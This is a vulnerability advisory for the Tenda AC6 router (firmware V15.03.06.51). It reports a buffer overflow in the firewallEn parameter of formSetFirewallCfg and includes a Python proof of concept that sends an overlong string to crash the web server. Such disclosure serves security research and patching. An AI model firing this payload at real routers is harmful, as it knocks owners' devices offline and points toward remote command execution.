# Information



Vendor of the products:  Shenzhen Jixiang Tenda Technology Co., Ltd.

Vendor's website:  [Homepage_Tenda Global(English)](https://www.tendacn.com/)

Reported by:   b55t4ck(2640807724@qq.com)

Affected products: Tenda  AC6

Affected firmware version: v2.0_V15.03.06.51

Firmware download address:  https://www.tendacn.com/material/show/103794



# Overview

Tenda AC6 is a wireless router from China's Tenda company.

During analysis of the /bin/httpd binary, it was discovered that the firewallEn parameter in the formSetFirewallCfg function directly accepts client data through websGetVar without any length validation. This vulnerability allows users to crash the program by constructing overly long strings, rendering it inoperable, and also enables attackers to craft carefully prepared payloads to achieve arbitrary command execution.

# Vulnerability details

Analysis of the /bin/httpd binary in IDA revealed that after obtaining values from user input through the webGetVar function, the program calls the strcpy function at line 55 to directly copy the user-supplied firewallEn parameter content into the firewall_buf variable. Since firewall_buf is a fixed-length array and the program lacks input length restrictions, this results in a buffer overflow vulnerability.

![image-20250831182316062](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508311823079.png)

![image-20250831182213556](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508311822585.png)



Due to the absence of corresponding symbol tables and the target device, it is not possible to perform deeper debugging using GDB in this context. Otherwise, it would be feasible to construct shellcode or ROP chains to obtain shell access, potentially causing more severe security implications.

# POC

```python
from pwn import *
import requests

url = "http://192.168.1.100/goform/SetFirewallCfg"
cookie = {"Cookie": "password=b55t4ck"}


data = {
	"firewallEn":cyclic(1024)
        }


headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}


try:
    response = requests.post(url, cookies=cookie, data=data, headers=headers)
    print(response.text)
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")


```

# Effect Demonstration

After executing the corresponding Python script, the program crashes as expected.

![image-20250831182527415](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508311825463.png)